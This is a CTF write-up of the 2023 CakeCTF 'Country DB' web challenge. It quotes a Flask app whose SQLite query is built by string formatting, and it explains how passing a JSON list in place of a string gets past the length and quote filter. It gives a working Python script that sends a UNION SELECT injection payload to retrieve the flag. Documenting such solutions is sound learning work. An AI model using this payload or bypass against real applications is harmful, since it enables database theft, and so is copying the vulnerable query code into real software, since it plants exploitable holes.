---
title: 2023 CakeCTF - Country DB
date: 2023-11-11 00:00:00 +0700
categories:
  - Write-ups
tags:
  - 2023_CakeCTF
  - Web Exploitation
  - SQL injection
---

## Overview

* 68 points / 246 solves
* author: ptr-yudai
* tag: warm-up

## Description

> Do you know which country code 'CA' and 'KE' are for?
> Search country codes [here](http://countrydb.2023.cakectf.com:8020/)!

### Attached

[country-db.zip](https://github.com/encuetee/CTF-writeups/blob/main/2023/2023_CakeCTF/attached/country_db_fc1912477a433a93f7d75a9b80389582.zip)


This is ```app.py``` file
```py
#!/usr/bin/env python3
import flask
import sqlite3

app = flask.Flask(__name__)

def db_search(code):
    with sqlite3.connect('database.db') as conn:
        cur = conn.cursor()
        cur.execute(f"SELECT name FROM country WHERE code=UPPER('{code}')")
        found = cur.fetchone()
    return None if found is None else found[0]

@app.route('/')
def index():
    return flask.render_template("index.html")

@app.route('/api/search', methods=['POST'])
def api_search():
    req = flask.request.get_json()
    if 'code' not in req:
        flask.abort(400, "Empty country code")

    code = req['code']
    if len(code) != 2 or "'" in code:
        flask.abort(400, "Invalid country code")

    name = db_search(code)
    if name is None:
        flask.abort(404, "No such country")

    return {'name': name}

if __name__ == '__main__':
    app.run(debug=True)

```

## Analyzation

Check ```init_db.py``` file, it is not hard to find out this is sqli.

The query is so simple

```sql
SELECT name FROM country WHERE code=UPPER('AF') UNION SELECT FLAG FROM FLAG -- trash
```

The main problem of this challenge is to bypass the filters
```py
req = flask.request.get_json()
if 'code' not in req:
    flask.abort(400, "Empty country code")

code = req['code']
if len(code) != 2 or "'" in code:
    flask.abort(400, "Invalid country code")
```

So the string's length must be 2.

Hmmm, does it have to be string??

## Vulnerability

It does not check type of ```code```, so it does not need to be a string. Another data type can be used instead.

After looking around, I find out ```list``` work!

## Solution

```py
import requests

# URL = "http://localhost:8020/api/search"
URL = "http://countrydb.2023.cakectf.com:8020/api/search"

data = {"code": ["') UNION SELECT FLAG FROM FLAG --", "# "]}

response = requests.post(URL, json=data)

print(response.text)
```

*I use empty string for the first query to prevent the result of that query stay up before flag*

The flag is
```
CakeCTF{b3_c4refUl_wh3n_y0U_u5e_JS0N_1nPut}
```

* Similar challenge: "upside-down cake" of TSG CTF (2023)*